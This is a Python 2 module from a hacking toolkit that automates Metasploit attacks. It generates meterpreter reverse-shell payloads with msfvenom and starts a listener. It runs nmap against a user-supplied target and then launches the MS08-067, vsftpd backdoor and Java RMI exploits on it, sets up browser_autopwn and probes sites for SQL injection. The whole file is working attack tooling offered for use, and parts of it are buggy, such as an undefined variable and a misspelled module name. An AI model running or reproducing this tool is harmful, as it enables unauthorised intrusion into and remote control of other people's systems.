## lzmfix.py - useful module of Lazyfix
# -*- coding: utf-8 -*-
import os
import sys
import time
import requests
#by abdala
class bcolors:
    OKGREEN = '\033[92m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    OKBLUE = '\033[94m'
	
tools_banner = """
__  __  _     ____   ___   ____ ____ ___    _____ ___   ___  _     ____
|  \/  |/ _ \|  _ \ / _ \ / ___/ ___/ _ \  |_   _/ _ \ / _ \| |   / ___| 
| |\/| | | | | |_) | | | | |  | |  | | | |   | || | | | | | | |   \___ \ 
| |  | | |_| |  _ <| |_| | |__| |__| |_| |   | || |_| | |_| | |___ ___) |
|_|  |_|\___/|_| \_\\___/ \____\____\___/    |_| \___/ \___/|_____|____/                                                                                        
*/--------------------------------------------------------------------/*
*-**********SCRIPT BY black protocol AND yehia ali*********************-*
*-********** black protocol : https://www.facebook.com/protocol.black.47 *
*-********** yehia ali : https://www.facebook.com/yehia.hacker           *
*-_____________________________________________________________________-*
*-               website: https://omegeng.blogspot.com-*                           
*/---------------------------------------------------------------------/* 
                           
"""
backtomenu_banner = """
  [99] Back to main menu
  [00] Exit the morocco tools
"""
def restart_program():
	python = sys.executable
	os.execl(python, python, * sys.argv)
	curdir = os.getcwd()

def backtomenu_option():
	print backtomenu_banner
	backtomenu = raw_input("protocol > ")
	
	if backtomenu == "99":
		restart_program()
	elif backtomenu == "00":
		sys.exit()
	else:
		print "\nERROR: Wrong Input"
		time.sleep(2)
		restart_program()

def banner():
    print tools_banner	
	
def mak_pylaod():	
        print bcolors.OKGREEN + " [*]type pyload = exemple ==> php or android OR windows[*]" + bcolors.ENDC
        ok = raw_input('[+] ENTER YOUR TYPE PAYLOAD: ')
        time.sleep(2)
        print bcolors.OKGREEN + " [**]lhost = exmeple ==> 192.168.1.** OR 45.15.544.25[**]" + bcolors.ENDC
        time.sleep(2)
        host = raw_input('[+] ENTER YOUR LHOST: ')
        time.sleep(2)
        print bcolors.OKGREEN + " [***]port = exemple ==> 4444 OR any port[***]" + bcolors.ENDC
        port = raw_input('[+] ENTER YOUR LPORT: ')
        time.sleep(2)
        print bcolors.OKGREEN + " [****]directory = exemple ==> /sdcard OR any directory you want[****]" + bcolors.ENDC
        directory = raw_input('[+] ENTER YOUR PYLOAD DIRECTORY: ')
        time.sleep(2)
        print bcolors.OKGREEN + " [*****]name pyload = exemple ==> black.apk OR black.php or black.exe [*****]" + bcolors.ENDC
        name = raw_input('[+] ENTER YOU PYLOAD NAME WITH FINAL: ')
        time.sleep(2)
        make = 'msfvenom -p {}/meterpreter/reverse_tcp lhost={} lport={} -o {}/{}'.format(ok, host, port, directory, name)
        os.system(make)

def start_hacking():
    print bcolors.OKGREEN + "\n [+] starting open metasploit  " + bcolors.ENDC
    first = raw_input('[+] Enter lhost: ')
    time.sleep(2)
    first1 = raw_input('[+] Enter lport: ')
    time.sleep(2)
    first2 = raw_input('Enter type payload: ')
    time.sleep(2)
    os.system('service postgresql start')
    file = open('starthack.rc','w')
    type1 = 'use exploit/multi/handler\n'
    type2 = 'set payload {}/meterpreter/reverse_tcp\n'.format(first2)
    ip1 = 'set lhost {}\n'.format(first)
    ip2 = 'set lport {}\n'.format(first1)
    start = 'exploit\n'
    file.write(type1 + type2 + ip1 + ip2 + start)
    file.close()
    os.system('msfconsole -r starthack.rc')
    time.sleep(4)

def scan_ip():
    os.system('pkg install nmap')
    os.system('apt-get install nmap')
    nm = "nmap "
    out = ">>nmap.txt"
    ip = raw_input("[+] Enter ip of you target: ")
    time.sleep(2)
    os.system(nm + ip + out)
    file = open("nmap.txt")
    strings = file.read()
    term = "microsoft-sd"
    if(term in strings):
        hack_445()
        time.sleep(3)
    else:
       print bcolors.FAIL + "port 445 is not open in ip" + bcolors.ENDC
       time.sleep(3)

    file = open("nmap.txt")
    strings = file.read()
    term = "ftp"
    if(term in strings):
        hack_21()
        time.sleep(3)
    else:
       print bcolors.FAIL + "port 21 is not open in ip" + bcolors.ENDC
       time.sleep(3)

    file = open("nmap.txt")
    strings = file.read()
    term = "rmiregistry"
    if(term in strings):
        hack_1099()
        time.sleep(3)
    else:
       print bcolors.FAIL + "port 1099 is not open in ip" + bcolors.ENDC
       time.sleep(3)
    file.close()
    
def hack_445():
    print bcolors.OKGREEN + "[+] port 445 is open in this ip (ATTACK WINDOWS)" + bcolors.ENDC
    file = open('hack445.rc','w')
    lhost = raw_input('[+] Enter your ip: ')
    time.sleep(2)
    rhost = raw_input('[+] Enter your target ip: ')
    time.sleep(2)
    type1 = 'use exploit/windows/smb/ms08_067_netapi\n'
    type2 = 'set payload windows/meterpreter/reverse_tcp\n'
    ip3 = 'set lhost {}\n'.format(lhost)
    ip4 = 'set rhost {}\n'.format(rhost)
    ip5 = 'exploit\n'
    file.write(type1 + type2 + ip3 + ip4 + ip5)
    file.close()
    os.system('msfconsole -r hack445.rc')
    
def hack_21():
    print bcolors.OKGREEN + "[+]port 21 is open in ip" + bcolors.ENDC
    file = open('hack21.rc','w')
    rhost = raw_input('[+] Enter your target ip: ')
    time.sleep(2)
    type1 = 'use exploit/unix/ftp/vsftpd_234_backdoor\n'
    type2 = 'set payload cmd/unix/interact\n'
    ip3 = 'set rhost {}\n'.format(rhost)
    ip4 = 'exploit\n'
    ip5 = 'exploit\n'
    file.write(type1 + type2 + ip3 + ip4 + ip5)
    file.close()
    os.system('msfconsole -r hack21.rc')

def hack_1099():
    print bcolors.OKGREEN + "[+]port 1099 is open in ip" + bcolors.ENDC
    file = open('hack1099.rc','w')
    lhost = raw_input('[+] Enter your ip: ')
    time.sleep(2)
    port = raw_input('[+] Enter your port: ')
    time.sleep(2)
    rhost = raw_input('[+]Enter your target ip: ')
    time.sleep(2)
    type1 = 'use exploit/multi/misc/java_rmi_server\n'
    type2 = 'set TARGET 0\n'
    type3 = 'set PAYLOAD java/meterpreter/bind_tcp\n'
    type4 = 'set LHOST {}\n'.format(lhost)
    type5 = 'set LPORT {}\n'.format(port)
    type6 = 'set HTTPDELAY 10\n'
    type7 = 'set RPORT 10904\n'
    type8 = 'set SRVPORT 8080\n'
    type9 = 'set SSL 0\n'
    type10 = 'set SRVHOST 0.0.0.0\n'
    type11 = 'set RHOST {}'.format(rhost)
    ip4 = 'exploit -j\n'
    file.write(type1 + type2 + type3 + type4 + type5 +type6 + type7 + type8 + type9 + type10 + type11 + ip4)
    file.close()
    os.system('msfconsole -r hack1099.rc')
    
def sql_injection():
        print bcolors.OKGREEN + "\n######  put your website with this sympol ' in end of url  " + bcolors.ENDC
        time.sleep(4)
        url = raw_input('Enter your website: ')
        r = requests.get(url)
        if 'You have an error in your SQL' in r.text:
          print bcolors.OKGREEN + "\n######  your website is vulnerability " + bcolors.ENDC
        else:
          print bcolors.FAIL + "\n###### your website is not vulnerability " + bcolors.ENDC
		
def remove():
    os.system('rm -r hack21.rc')
    os.system('rm -r nmap.txt')
    os.system('rm -r hack445.rc')   
    os.system('rm -r hack1099.rc')
    os.system('rm -r starthack.rc')

def kali_user():
    os.system('apt-get update')
    os.system('apt-get install nmap')
    os.system('apt-get install python-pip')
    os.system('pip install requests')
    print "##done##"

def termux_user():
    os.system('pkg update')
    os.system('pkg upgrade')
    os.system('pkg install nmap')
    os.system('pkg install python')
    os.system('pkg install python-pip')
    os.system('pip install requests')
    print "##done##"

def link_hack():
    print bcolors.OKGREEN + "[+]start open metasploi" + bcolors.ENDC
    file = open('linkhack.rc','w')
    lhost = raw_input('[+] Enter your lhost: ')
    time.sleep(2)
    lport = raw_input('[+] Enter your port: ')
    time.sleep(2)
    type1 = 'use auxiliary/server/browser_autopwns\n'
    type2 = 'set LHOST {}\n'.format(lhost)
    type3 = 'set SRVHOST {}\n'.format(lhost)
    type4 = 'set SRVPORT {}\n'.format(port)
    ip3 = 'set URIPATH test\n'
    ip4 = 'exploit\n'
    file.write(type1 + type2 + type3 + type4 + ip3 + ip4)
    file.close()
    os.system('msfconsole -r linkhack.rc')








              
